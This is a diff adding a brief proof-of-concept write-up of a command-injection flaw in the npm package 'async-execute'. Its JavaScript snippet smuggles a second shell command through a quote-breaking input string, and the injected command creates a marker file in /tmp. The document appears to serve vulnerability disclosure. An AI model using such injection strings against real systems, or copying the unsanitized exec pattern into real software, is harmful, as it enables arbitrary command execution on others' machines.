@@ -1,0 +1,18 @@
+The vulnerability is straightforward: `async-execute` passes the `script` argument directly into `child_process.exec` with no sanitization, so any string (including shell metacharacters) is executed by a shell — classic command injection.
+
+```javascript
+const execute = require("async-execute");
+
+// Simulates an application that builds a shell command using
+// unsanitized, attacker-controlled input (e.g. a filename, username, etc.)
+const userInput = "'; touch /tmp/pwned_by_async_execute; echo 'done";
+
+execute(`echo Hello, ${userInput}`)
+  .then((result) => {
+    console.log("Command output:", result);
+    console.log("Injected command executed — check /tmp/pwned_by_async_execute");
+  })
+  .catch((error) => {
+    console.error("Execution error:", error);
+  });
+```
